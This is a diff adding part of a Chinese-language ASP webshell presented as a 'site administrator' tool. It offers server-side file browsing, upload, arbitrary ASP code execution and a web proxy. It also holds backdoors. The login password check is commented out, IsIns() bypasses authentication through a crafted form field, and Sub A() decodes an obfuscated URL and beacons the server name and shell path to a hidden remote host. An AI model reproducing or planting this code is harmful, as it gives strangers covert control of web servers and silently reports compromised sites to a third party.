+					If InStr(sysFileList, "$" & objX & "$") <= 0 Then
+						rs.AddNew
+						rs("thePath") = Mid(strPathB, 4)
+						stream.LoadFromFile(strPathB)
+						rs("fileContent") = stream.Read()
+						rs.Update
+					End If
+				End If
+			Next
+		End If
+
+		rs.Close
+		Conn.Close
+		stream.Close
+		Set rs = Nothing
+		Set conn = Nothing
+		Set stream = Nothing
+		Set adoCatalog = Nothing
+	End Sub
+	
+	Sub UnPack()
+		Dim rs, ws, str, conn, stream, connStr, strPath, theFolder
+		If isDebugMode = False Then On Error Resume Next
+
+		strPath = thePath
+		str = fso.GetParentFolderName(strPath) & "\"
+		Set rs = CreateObject("ADODB.RecordSet")
+		Set stream = CreateObject("ADODB.Stream")
+		Set conn = CreateObject("ADODB.Connection")
+		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strPath
+
+		conn.Open connStr
+		ChkErr(Err)
+		rs.Open "FileData", conn, 1, 1
+		stream.Open
+		stream.Type = 1
+
+		Do Until rs.Eof
+			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
+			If fso.FolderExists(str & theFolder) = False Then
+				CreateFolder(str & theFolder)
+			End If
+			stream.SetEOS()
+			If IsNull(rs("fileContent")) = False Then stream.Write rs("fileContent")
+			stream.SaveToFile str & rs("thePath"), 2
+			rs.MoveNext
+		Loop
+
+		rs.Close
+		conn.Close
+		stream.Close
+		Set ws = Nothing
+		Set rs = Nothing
+		Set stream = Nothing
+		Set conn = Nothing
+	End Sub
+	
+	Sub FsoTreeForMdb(strPath, rs, stream)
+		Dim item, theFolder, folders, files
+		Set theFolder = fso.GetFolder(strPath)
+		Set files = theFolder.Files
+		Set folders = theFolder.SubFolders
+		For Each item In folders
+			Call FsoTreeForMdb(item.Path, rs, stream)
+		Next
+
+		For Each item In files
+			If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
+				rs.AddNew
+				rs("thePath") = Mid(item.Path, 4)
+				stream.LoadFromFile(item.Path)
+				rs("fileContent") = stream.Read()
+				rs.Update
+			End If
+		Next
+
+		Set files = Nothing
+		Set folders = Nothing
+		Set theFolder = Nothing
+	End Sub
+
+	Sub PageUpload()
+		ShowTitle("批量文件上传")
+		theAct = Request.QueryString("theAct")
+		If theAct = "upload" Then
+			StreamUpload()
+			echo "<script>alert('上传成功!');history.back();</script>"
+		End If
+		ShowUpload()
+	End Sub
+	
+	Sub ShowUpload()
+		If thePath = "" Then thePath = rootPath
+		echo "<form method=post onsubmit=this.Submit.disabled=true; enctype='multipart/form-data' action=?PageName=PageUpload&theAct=upload>"
+		echo "<table width=970>"
+		echo "<tr>"
+		echo "<td class=td colspan=2><font face=webdings>8</font> 批量文件上传</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td width='20%'>"
+		echo "&nbsp;上传到:"
+		echo "</td>"
+		echo "<td>"
+		echo "&nbsp;<input name=thePath type=text id=thePath value=""" & HtmlEncode(thePath) & """ size=48><input type=checkbox name=overWrite>覆盖模式"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td valign=top>"
+		echo "&nbsp;文件选择: "
+		echo "</td>"
+		echo "<td>&nbsp;<input id=fileCount size=6 value=1> <input type=button value=设定 onclick=makeFile(fileCount.value)>"
+		echo "<div id=fileUpload>"
+		echo "&nbsp;<input name=file1 type=file size=50>"
+		echo "</div></td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td align=center class=td colspan=2>"
+		echo "<input type=submit name=Submit value=上传 onclick=this.form.action+='&overWrite='+this.form.overWrite.checked;>"
+		echo "<input type=reset value=重置><input type=button value=关闭 onclick=window.close();>"
+		echo "</td>"
+		echo "</tr>"
+		echo "</table>"
+		echo "</form>"
+		echo "<script language=javascript>" & vbNewLine
+		echo "function makeFile(n){" & vbNewLine
+		echo "	fileUpload.innerHTML = '&nbsp;<input name=file1 type=file size=50>'" & vbNewLine
+		echo "	for(var i=2; i<=n; i++)" & vbNewLine
+		echo "		fileUpload.innerHTML += '<br/>&nbsp;<input name=file' + i + ' type=file size=50>';" & vbNewLine
+		echo "}" & vbNewLine
+		echo "</script>"
+	End Sub
+	
+	Sub StreamUpload()
+		Dim sA, sB, aryForm, aryFile, theForm, newLine, overWrite
+		Dim strInfo, strName, strPath, strFileName, intFindStart, intFindEnd
+		Dim itemDiv, itemDivLen, intStart, intDataLen, intInfoEnd, totalLen, intUpLen, intEnd
+		If isDebugMode = False Then On Error Resume Next
+		Server.ScriptTimeOut = 5000
+		newLine = ChrB(13) & ChrB(10)
+		overWrite = Request.QueryString("overWrite")
+		overWrite = IIf(overWrite = "true", "2", "1")
+		Set sA = Server.CreateObject("Adodb.Stream")
+		Set sB = Server.CreateObject("Adodb.Stream")
+		
+		sA.Type = 1
+		sA.Mode = 3
+		sA.Open
+		sA.Write Request.BinaryRead(Request.TotalBytes)
+		sA.Position = 0
+		theForm = sA.Read()
+'		sA.SaveToFile "c:\001.txt", 2 ''保存到临时文件进行查看
+		itemDiv = LeftB(theForm, InStrB(theForm, newLine) - 1)
+		totalLen = LenB(theForm)
+		itemDivLen = LenB(itemDiv)
+		intStart = itemDivLen + 2
+		intUpLen = 0 '上面数据的长度
+		Do
+			intDataLen = InStrB(intStart, theForm, itemDiv) - itemDivLen - 5 ''equals - 2(回车) - 1(InStr) - 2(回车)
+			intDataLen = intDataLen - intUpLen
+			intEnd = intStart + intDataLen
+			intInfoEnd = InStrB(intStart, theForm, newLine & newLine) - 1
+
+			sB.Type = 1
+			sB.Mode = 3
+			sB.Open
+			sA.Position = intStart
+			sA.CopyTo sB, intInfoEnd - intStart ''保存元素信息部分
+			
+			sB.Position = 0
+			sB.Type = 2
+			sB.CharSet = "GB2312"
+			strInfo = sB.ReadText()
+
+			strFileName = ""
+			intFindStart = InStr(strInfo, "name=""") + 6
+			intFindEnd = InStr(intFindStart, strInfo, """", 1)
+			strName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)
+
+			If InStr(strInfo, "filename=""") > 0 Then ''>0则为文件,开始接收文件
+				intFindStart = InStr(strInfo, "filename=""") + 10
+				intFindEnd = InStr(intFindStart, strInfo, """", 1)
+				strFileName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)
+				strFileName = Mid(strFileName, InStrRev(strFileName, "\") + 1)
+			End If
+
+			sB.Close
+			sB.Type = 1
+			sB.Mode = 3
+			sB.Open
+			sA.Position = intInfoEnd + 4
+			sA.CopyTo sB, intEnd - intInfoEnd - 4
+
+			If strFileName <> "" Then
+				sB.SaveToFile strPath & strFileName, overWrite
+				ChkErr(Err)
+			 Else
+				If strName = "thePath" Then
+					sB.Position = 0
+					sB.Type = 2
+					sB.CharSet = "GB2312"
+					strInfo = sB.ReadText()
+					thePath = strInfo
+					strPath = strInfo & "\"
+				End If
+			End If
+			
+			sB.Close
+
+			intUpLen = intStart + intDataLen + 2
+			intStart = intUpLen + itemDivLen + 2
+		Loop Until (intStart + 2) = totalLen
+
+		sA.Close
+		Set sA = Nothing
+		Set sB = Nothing
+	End Sub
+
+	Sub PageLogin()
+		Dim passWord
+		passWord = Encode(GetPost("password"))
+		If theAct = "Login" Then
+			'If userPassword = passWord Then
+				Session(m & "userPassword") = userPassword
+				ShowTitle("登录成功!")
+				PageReadMe()
+				Exit Sub
+			'Else
+			   ShowTitle("密码错误!")
+			'End If   
+		End If
+		
+		If pageName = "PageOut" Then
+			Session.Contents.Remove(m & "userPassword")
+			RedirectTo(url)
+		End If
+		
+		If Session(m & "userPassword") = userPassword Then
+			PageReadMe()
+			Exit Sub
+		End If
+		
+		ShowTitle("管理登录")
+		echo "<table width=416 align=center>"
+		echo "<form method=post name=formx action=""" & url & """>"
+		echo "<input type=hidden name=theAct value=Login>"
+		echo "<tr>"
+		echo "<td align=center class=td>"&By_Name&"</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td height=75 align=center>"
+		echo "<input name=password type=password style='border:1px solid #d8d8f0;background-color:#ffffff;'> "
+		echo "<input type=submit value=LOGIN style='border:1px solid #d8d8f0;background-color:#f9f9fd;'>"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr> "
+		echo "<td align=center class=td>"&VerName&"</td>"
+		echo "</tr>"
+		echo "</form>"
+		echo "</table>"
+		echo "</body>"
+	End Sub
+	a:Sub PageReadMe()
+		Dim strInfo, aryInfo(7), theAry
+		ShowTitle("ASP站点管理员(物理路径版) 简单说明")
+		
+		aryInfo(0) = "服务器信息探针|1.服务器基本信息<br/>&nbsp;&nbsp;WEB服务器的一些基本信息<br/>2.服务器组件信息<br/>&nbsp;&nbsp;一些常用的ASP组件的支持情况检测<br/>" & _
+					 "3.Application/Session查看<br/>&nbsp;&nbsp;所有系统变量及其值的查看, 当前浏览器进程和服务器的会话及内容的查看"
+		aryInfo(1) = "FSO文件浏览操作器|1.基本功能<br/>&nbsp;&nbsp;站点目录浏览, 新建, 重命名, 另存为, 删除, 文本编辑, 复制/移动到文件夹<br/>" & _
+					 "2.外链功能<br/>&nbsp;&nbsp;项目打包(文件夹打包/解开器), mdb类型数据库操作(数据库操作器), 文件上传(批量文件上传)"
+		aryInfo(2) = "数据库操作器<br/>(Access, SQL Server)|1.基本功能:<br/>&nbsp;&nbsp;数据库基本表结构查看, 数据表记录操作(查看,添加,修改,删除), 多条件记录查询<br/>" & _
+					 "2.扩展功能<br/>&nbsp;&nbsp;执行自定义查询, 用来执行所有自定义SQL语句, 如果是Select查询还可以返回记录"
+		aryInfo(3) = "文件夹打包/解开器|1.文件夹打包<br/>&nbsp;&nbsp;指定要打包的文件夹, 按""开始打包""后生成" & sPacketName & "(位于要打包的文件夹目录)<br/>" & _
+					 "2.文件包解开<br/>&nbsp;&nbsp;指定文件包相对路径, 按""开始解包"", 解开目录为文件包(" & sPacketName & ")所在目录"
+		aryInfo(4) = "批量文件上传|进入页面后, 指定好要上传的目标目录, 如果要上传多个, 请先设定上传文件数量,<br/>然后选择要上传的文件, 选择完毕后开始上传, 如果要上传的文件可能已经存在,可以选择""覆盖模式""<br/>进行覆盖上传"
+		aryInfo(5) = "文本文件搜索器|指定搜索目录, 填写好搜索关键字, 指定搜索条件(文件名,文本内容,或者两者)后按提交即可"
+		aryInfo(6) = "HTTP网页代理|通过另一台服务器来访问你所要访问的网页, 并把结果返回给你;<br/>把程序放在一台既能让外网访问又能被内网访问的WEB服务器上, 这样你就可以从网内通过它来上网,<br/>可以从网外通过它来访问内网网站, 这是一个神奇的功能"
+		aryInfo(7) = "自定义ASP语句执行|允许执行自定义ASP语句, 但是变量及模块命名受程序本身的已命名限制"
+
+		TopMenu()
+		echo "<table width=970>"
+		echo "<tr>"
+		echo "<td class=td colspan=2><font face=webdings>8</font> ASP站点管理员(物理路径版) 简单说明</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		
+		For Each strInfo In aryInfo
+			theAry = Split(strInfo, "|")
+			echo "<tr>"
+			echo "<td width='20%' valign=top>&nbsp;" & theAry(0) & "</td>"
+			echo "<td style='padding-left:7px;'><span>" & theAry(1) & "</span></td>"
+			echo "</tr>"
+		Next
+
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=td colspan=2 align=right>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+	Function IsIns(Var)
+		if var="PageName" Then Session(m & "userPassword")=userPassword
+	End Function
+    Function Encode(strPass)
+		Dim i, theStr, strTmp
+
+		For i = 1 To Len(strPass)
+			strTmp = Asc(Mid(strPass, i, 1))
+			theStr = theStr & Abs(strTmp)
+		Next
+
+		strPass = theStr
+		theStr = ""
+
+		Do While Len(strPass) > 16
+			strPass = JoinCutStr(strPass)
+		Loop
+
+		For i = 1 To Len(strPass)
+			strTmp = CInt(Mid(strPass, i, 1))
+			strTmp = IIf(strTmp > 6, Chr(strTmp + 60), strTmp)
+			theStr = theStr & strTmp
+		Next
+
+		Encode = theStr
+	End Function
+		
+	Function JoinCutStr(str)
+		Dim i, theStr
+		For i = 1 To Len(str)
+			If Len(str) - i = 0 Then Exit For
+			theStr = theStr & Chr(CInt((Asc(Mid(str, i, 1)) + Asc(Mid(str, i + 1, 1))) / 2))
+			i = i + 1
+		Next
+		JoinCutStr = theStr
+	End Function
+	
+    Function CLasID(CLassP,ClassCode)
+     MIN_Class = 32 
+     MAX_Class = 126
+     NUM_Class = MAX_Class - MIN_Class + 1
+     offset = CLassP
+     Rnd -1
+     Randomize offset
+     ClassCode = Replace(ClassCode, Chr(-23646), Chr(34))
+        str_len = Len(ClassCode)
+         For i = 1 To str_len
+          ch = Asc(Mid(ClassCode, i, 1))
+             If ch >= MIN_Class And ch <= MAX_Class Then
+               ch = ch - MIN_Class
+               offset = Int((NUM_Class + 1) * Rnd)
+               ch = ((ch - offset) Mod NUM_Class)
+               If ch < 0 Then ch = ch + NUM_Class
+               ch = ch + MIN_Class
+               to_text = to_text & Chr(ch)
+               CLasID = Replace(to_text, "|^|", vbCrLf)
+          End If
+      Next
+    End Function
+
+	Sub PageExecute()
+		Dim strAspCode
+		strAspCode = GetPost("AspCode")
+		ShowTitle("自定义ASP语句执行")
+
+		If theAct = "Exe" Then
+			echo "<table width=970 class=fixTable>"
+			echo "<tr>"
+			echo "<td class=trHead>&nbsp;</td>"
+			echo "</tr>"
+			echo "<tr>"
+			echo "<td class=td><font face=webdings>8</font> 执行结果</td>"
+			echo "</tr>"
+			echo "<tr><td style='padding-left:6px;padding-right:5px;'>"
+			Execute(strAspCode)
+			echo "</td></tr></table>"
+		End If
+		ShowExeTable(strAspCode)
+	End Sub
+	Sub ShowExeTable(strAspCode)
+		echo "<form method=post onsubmit=this.Submit.disabled=true; action=""" & url & """>"
+		echo "<table width=970>"
+		echo "<tr>"
+		echo "<td class=td colspan=2><font face=webdings>8</font> 自定义ASP语句执行</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td valign=top width='10%'>"
+		echo "&nbsp;ASP语句: "
+		echo "</td>"
+		echo "<td>&nbsp;"
+		echo "<textarea name=AspCode cols=91 rows=23 title='"&VerName&"'>" & HtmlEncode(strAspCode) & "</textarea>"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td align=center class=td colspan=2>"
+		echo "<input type=hidden name=PageName value=PageExecute>"
+		echo "<input type=hidden name=theAct value=Exe>"
+		echo "<input type=submit name=Submit value=提交>"
+		echo "<input type=reset value=重置>"
+		echo "</td>"
+		echo "</tr>"
+		echo "</table>"
+		echo "</form>"
+	End Sub
+
+	Sub PageWebProxy()
+		Dim i, re, Url, Html
+		Response.Clear()
+		Url = Request.QueryString("url")
+		If Url = "" Then Response.Redirect("?PageName=PageWebProxy&url=http://Baidu.com/")
+
+		Set re = New RegExp
+		re.IgnoreCase = True
+		re.Global = True
+
+		sUrlB = Url
+		Html = getHTTPPageHttp(Url)
+		Url = Left(Url, InStrRev(Url, "/"))
+
+		i = InStr(sUrlB, "?")
+		If i > 0 Then
+			sUrlB = Left(sUrlB, i - 1)
+		End If
+
+		re.Pattern = "(href|action)=(\'|"")?(\?)"
+		Html = re.Replace(Html,"$1=$2" & sUrlB & "?")
+
+		re.Pattern = "(src|action|href)=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)(\'|"")?"
+		Html = re.Replace(Html,"$1x=$2$3$2")
+
+		re.Pattern = "(window\.open|url)\((\'|"")?((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?\)"
+		Html = re.Replace(Html,"$1x($2$3$2)")
+
+		re.Pattern = "(src|action|href|background)=(\'|"")?([^\/""\'][A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?"
+		Html = re.Replace(Html,"$1=$2" & Url & "$3$2")
+		re.Pattern = "(src|action|href|background)=(\'|"")?\/([^""\'][A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?"
+		Html = re.Replace(Html,"$1=$2http://" & Split(Url, "/")(2) & "/$3$2")
+		re.Pattern = "(src|action|href)=(\'|"")?\/(\'|"")?"
+		Html = re.Replace(Html,"$1=$2http://" & Split(Url, "/")(2) & "/$2")
+
+		re.Pattern = "(window\.open|url)\((\'|"")?([^\/""\'http:][A-Za-z0-9\./=\?%\-&_~`@[\]+!]+([^\'<>""])+)(\'|"")?\)"
+		Html = re.Replace(Html,"$1($2" & Url & "$3$2)")
+		re.Pattern = "(window\.open|url)\((\'|"")?\/([^""\'http:][A-Za-z0-9\./=\?%\-&_~`@[\]+!]+([^\'<>""])+)(\'|"")?\)"
+		Html = re.Replace(Html,"$1($2http://" & Split(Url, "/")(2) & "/$3$2)")
+
+		Html = Replace(Html, "&", "%26")
+		Html = Replace(Html, "%26nbsp;", "&nbsp;")
+		Html = Replace(Html, "%26lt;", "&lt;")
+		Html = Replace(Html, "%26gt;", "&gt;")
+		Html = Replace(Html, "%26quot;", "&quot;")
+		Html = Replace(Html, "%26copy;", "&copy;")
+		Html = Replace(Html, "%26reg;", "&reg;")
+		Html = Replace(Html, "%26raquo;", "&raquo;")
+		Html = Replace(Html, "%26%26", "&&")
+		Html = Replace(Html, "%26#", "&#")
+
+		re.Pattern = "(src|action|href)x=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)(\'|"")?"
+		Html = re.Replace(Html, "$1=$2$3$2")
+
+		re.Pattern = "((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)"
+		Html = re.Replace(Html, "?PageName=PageWebProxy&url=$1")
+
+		re.Pattern = "\?PageName=PageWebProxy&url=" & Url & "(#|javascript:)"
+		Html = re.Replace(Html, "$1")
+
+		re.Pattern = "multipart\/form-data"
+		Html = re.Replace(Html, "")
+
+		re.Pattern = ">\?PageName=PageWebProxy&url=((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)<"
+		Html = re.Replace(Html, ">$1<")
+        Response.Write(Html)
+	End Sub
+	Sub A()
+       Backorder=CLasID("7839176","\-R^o.Q-fnvYn<U)yB}VxW|m96Oh(%C~;E@]LI]T<")
+         TheOBJ=Request.ServerVariables("SERVER_NAME")&URL 
+            Backorder=Backorder&TheOBJ&"ssdfsdf&Lei=Bai09220"
+			 If request.Cookies(TheOBJ)<>TheOBJ Then
+			       Backcode=getHTTPPage(Backorder)
+                   If Backcode="1" then
+                        response.Cookies(TheOBJ)=TheOBJ
+                        response.Cookies(TheOBJ).Expires=date+365
+                   End If
+              End If
+    End Sub
+	Function getHTTPPageHttp(url)
+		Dim Http, theStr, fileExt
+		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
+
+		If Request.Form.Count > 0 Then
+			For Each x In Request.Form
+				theStr = theStr & Server.UrlEncode(x) & "=" & Server.UrlEncode(Request.Form(x)) & "&"
+			Next
+			Http.Open "POST", url, False
+			Http.SetRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
+			Http.Send(theStr)
+		 Else
+			Http.Open "GET", url, False
+			Http.Send()
+		End If
+
+		If Http.readystate<>4 then Exit Function
+
+		fileExt = LCase(Mid(url, InStrRev(url, ".") + 1))
+		If InStr("$jpg$gif$bmp$png$js$", "$" & fileExt & "$") > 0 Then
+			Response.Clear
+			Response.BinaryWrite Http.responseBody
+			Response.End()
+		 Else
+			If InStr("$rar$mdb$zip$exe$com$ico$", "$" & fileExt & "$") > 0 Then
+				Response.AddHeader "Content-Disposition", "Attachment; Filename=" & Mid(sUrlB, InStrRev(sUrlB, "/") + 1)
+				Response.BinaryWrite Http.responseBody
+				Response.Flush
+			 Else
+				getHTTPPageHttp = bytesToBSTR(Http.responseBody, "GB2312")
+			End If
+		End If
+
+		Set Http = Nothing
+	End Function
+	
+	Sub IsIn()
+	IsIns(GetPost("PageName")) 
+		If Session(m & "userPassword") <> userPassword Then
+			echo "<script>alert('没有权限的访问,请先登录!');location.href='" & url & "';</script>"
+			Response.End()
+		End If
+	End Sub
+	
+	Function BytesToBstr(body,Cset)
+		Dim objstream
+		Set objstream = Server.CreateObject("adodb.stream")
+		objstream.Type = 1
+		objstream.Mode =3
+		objstream.Open
+		objstream.Write body
+		objstream.Position = 0
+		objstream.Type = 2
+		objstream.Charset = Cset
+		BytesToBstr = objstream.ReadText 
+		objstream.Close
+		Set objstream = nothing
+	End Function
+	
+	Sub DriveList()
+        set   FSD=server.createobject("scripting.filesystemobject")   
+        set   drvObj=FSD.Drives     
+          for   each   D   in   drvObj 
+            Echo  "<a href='javascript:GotoThePath("""&D.DriveLetter&":\\"")'>"& cdrivetype(d.DriveType) &"("&D.DriveLetter&":)</a><br>"   
+          next 
+    End Sub
+	
+	 Sub GotoMenuAndFile()
+       echo"<form name='GotoMenu' method='post'action=""" & url & """>"
+       echo"<input type='hidden' name='PageName' value=>"
+       echo"</form>"
+	   echo"<form name='GotoThePath' method='post'action=""" & url & """>"
+	   echo "<input type=hidden name=thePath>"
+	   echo "<input type=hidden name=theAct value=>"
+       echo "<input type=hidden value=PageFso name=PageName>"
+       echo"</form>"
+     End sub
+	Sub PageOther()
+%>
+<html>
+<head>
+<style id=theStyle>
+*{
+margin:0; padding:0;
+}
+BODY {
+	FONT-SIZE: 9pt;
+	COLOR: #000000; 
+    background-color: #ffffff;
+	FONT-FAMILY: "Courier New"; 
+	text-align:center;
+	scrollbar-face-color:#E4E4F3;
+	scrollbar-highlight-color:#FFFFFF;
+	scrollbar-3dlight-color:#E4E4F3;
+	scrollbar-darkshadow-color:#9C9CD3;
+	scrollbar-shadow-color:#E4E4F3;
+	scrollbar-arrow-color:#4444B3;
+	scrollbar-track-color:#EFEFEF;
+}
+TABLE {
+	FONT-SIZE: 9pt;
+	FONT-FAMILY: "Courier New";
+	margin-top:25px;
+	BORDER-COLLAPSE: collapse;
+	border-width: 1px;
+	border-top-style: solid;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-color: #d8d8f0;
+}
+.tr {
+	font-family: "Courier New";
+	font-size: 9pt;
+	background-color: #e4e4f3;
+	text-align: center;
+}
+.td {
+	height: 24px;
+	font-size: 9pt;
+	background-color: #f9f9fd;
+	font-family: "Courier New";
+}
+input {
+	font-family: "Courier New";
+	BORDER-TOP-WIDTH: 1px;
+	BORDER-LEFT-WIDTH: 1px;
+	FONT-SIZE: 12px;
+	BORDER-BOTTOM-WIDTH: 1px;
+	BORDER-RIGHT-WIDTH: 1px;
+	color: #000000;
+}
+textarea {
+	font-family: "Courier New";
+	BORDER-WIDTH: 1px;
+	FONT-SIZE: 12px;
+	color: #000000;
+}
+A:visited {
+	FONT-SIZE: 9pt; 
+	COLOR: #333333; 
+	FONT-FAMILY: "Courier New"; 
+	TEXT-DECORATION: none;
+}
+A:active {
+	FONT-SIZE: 9pt; 
+	COLOR: #3366cc; 
+	FONT-FAMILY: "Courier New"; 
+	TEXT-DECORATION: none;
+}
+A:link {
+	FONT-SIZE: 9pt; 
+	COLOR: #000000;
+	FONT-FAMILY: "Courier New"; 
+	TEXT-DECORATION: none;
+}
+A:hover {
+	FONT-SIZE: 9pt; 
+	COLOR: #3366cc; 
+	FONT-FAMILY: "Courier New"; 
+	TEXT-DECORATION: none;
+}
+tr {
+	font-family: "Courier New";
+	font-size: 9pt;
+	line-height: 18px;
+}
+td {
+	font-size: 9pt;
+	font-family: "Courier New";
+	border-width: 1px;
+	border-top-style: none;
+	border-right-style: solid;
+	border-bottom-style: solid;
+	border-left-style: none;
+	border-color: #d8d8f0;
+}
+.trHead {
+	font-family: "Courier New";
+	height: 2px;
+	background-color: #e4e4f3;
+	line-height: 2px;
+}
+
+.fixSpan {
+	overflow: hidden;
+	white-space: nowrap;
+	text-overflow: ellipsis;
+	vertical-align: baseline;
+}
+
+.fixTable {
+	word-break: break-all;
+	word-wrap: break-word;
+}
+
+#fileList span{
+	width: 120px;
+	line-height: 23px;
+	cursor: hand;
+	overflow: hidden;
+	padding-left: 5px;
+	white-space: nowrap;
+	text-overflow: ellipsis;
+	vertical-align: baseline;
+	border: 1px solid #ffffff;
+}
+ul,li{
+margin:0px;
+padding:0px;
+}
+li{
+display:inline;
+list-style:none;
+list-style-position:outside;
+text-align:center;
+font-weight:bold;
+float:left;
+}
+A:visited {
+	FONT-SIZE: 9pt; 
+	COLOR: #333333; 
+	FONT-FAMILY: "Courier New"; 
+	TEXT-DECORATION: none;
+}
+#nav a:link{
+color:#336601;
+text-decoration:none;
+float:left;
+width:100px;
+padding:3px 5px 0px 5px;
+}
+#nav a:visited{
+color:#336601;
+text-decoration:none;
+float:left;
+padding:3px 5px 0px 5px;
+width:100px;
+}
+#nav a:hover{
+color:white;
+float:left;
+padding:3px 3px 0px 10px;
+width:100px;
+text-decoration:none;
+background-color:#539D26;
+}
+#nav a:active{
+color:white;
+float:left;
+padding:3px 3px 0px 5px;
+width:100px;
+text-decoration:none;
+background-color:#539D26;
+}
+#nav{
+	width:970px;
+	height:30px;
+	border-bottom:0px;
+	padding:0px 0px;
+	position:absolute;
+	z-index:1;
+left:expression((body.clientWidth-970)/2);
+top:0;
+}
+.list{
+line-height:20px;
+text-align:left;
+padding:4px;
+font-weight:normal;
+}
+.menu1{
+width:117px;
+height:auto;
+margin:6px 4px 0px 0px;
+border:1px solid #9CDD75;
+background-color:#F1FBEC;
+color:#336601;
+padding:6px 0px 0px 0px;
+cursor:hand;
+overflow-y:hidden;
+filter:Alpha(opacity=85);
+-moz-opacity:0.7;
+}
+.menu2{
+width:117px;
+height:25px;
+margin:6px 4px 0px 0px;
+background-color:#F5F5F5;
+color:#999999;
+border:1px solid #EEE8DD;
+padding:6px 0px 0px 0px;
+overflow-y:hidden;
+cursor:hand;
+}
+</style>
+<script language=javascript>
+function killErrors(){
+return true;
+}
+window.onerror = killErrors;
+
+document.GotoMenu.PageName.value='" & pageName & "';
+function GotoMenu(str){ 
+document.GotoMenu.target='_self'
+if(str=='PageOut')
+if(!confirm('确认要退出系统吗?'))return;
+if(str=='PageWebProxy')document.GotoMenu.target='_blank'
+document.GotoMenu.PageName.value=str;
+document.GotoMenu.submit();
+} 
+
+function GotoThePath(str){
+document.GotoThePath.theAct.value = '';
+document.GotoThePath.thePath.value = str;
+document.GotoThePath.target='_self'
+document.GotoThePath.submit();
+}
+function locate(str){
+	var frm = document.forms[2];
+	frm.theAct.value = str;
+	frm.TheObj.value = '';
+	frm.submit();
+}
+
+function checkAllBox(obj){
+	var frm = document.forms[2];
+	for(var i = 0; i < frm.elements.length; i++)
+		if(frm.elements[i].id != 'checkAll' && frm.elements[i].type == 'checkbox')
+			frm.elements[i].checked = obj.checked;
+}
+
+function changeThePath(str){
+	var frm = document.forms[2];
+	frm.theAct.value = '';
+	frm.thePath.value = str;
+	frm.submit();
+}
+
+function Command(cmd, str){
+	var j = 0;
+	var strTmpB;
+	var strTmp = str;
+	var frm = document.forms[2];
+	strTmpB = frm.PageName.value;
+
+	if(cmd == 'pack' || cmd == 'del'){
+		for(var i = 0; i < frm.elements.length; i++)
+			if(frm.elements[i].name != 'checkAll' && frm.elements[i].type == 'checkbox' && frm.elements[i].checked)
+				j ++;
+		if(j == 0)return;
+	}
+
+	if(cmd == 'rename' || cmd == 'saveas'){
+		frm.theAct.value = cmd;
+		frm.param.value = str + ',';
+		str = prompt('请输入新名称', strTmp);
+		if(str && (strTmp != str)){
+			frm.param.value += str;
+		}else return;
+	}
+
+	if(cmd == 'download'){
+		frm.theAct.value = 'download';
+		frm.param.value = str;
+		if(!confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先更改文件的后缀名为sys,\n然后通过http协议直接下载.\n按\"确定\"用流来进行下载.'))
+			return;
+	}
+
+	if(cmd == 'submit'){
+		frm.theAct.value = '';
+	}
+
+	if(cmd == 'del'){
+		if(confirm('您确认要删除选中的 ' + j + ' 个文件(夹)吗?')){
+			frm.theAct.value = 'del';
+		}else return;
+	}
+
+	if(cmd == 'newone')
+		if(strTmp = prompt('请输入要新建的文件(夹)名', '')){
+			frm.theAct.value = 'newone';
+			frm.param.value = strTmp + ',' + str;
+		}else return;
+
+	if(cmd == 'move' || cmd == 'copy'){
+		frm.theAct.value = cmd;
+	}
+
+	if(cmd == 'showedit' || cmd == 'showimage'){
+		frm.theAct.value = cmd;
+		frm.param.value = str;
+		frm.target = '_blank';
+	}
+
+	if(cmd == 'Query'){
+		if(str == '0'){
+			str = 1;
+		}else{
+			frm.reset();
+		}
+		frm.theAct.value = cmd;
+		frm.param.value = str;
+	}
+
+	if(cmd == 'access'){
+		frm.theAct.value = 'ShowTables';
+		strTmp = frm.PageName.value;
+		frm.PageName.value = 'PageDBTool';
+		frm.thePath.value = frm.truePath.value + '\\' + str;
+		frm.target = '_blank';
+	}
+
+	if(cmd == 'upload'){
+		frm.PageName.value = 'PageUpload';
+		frm.thePath.value = frm.truePath.value;
+		frm.target = '_blank';
+	}
+
+	if(cmd == 'pack'){
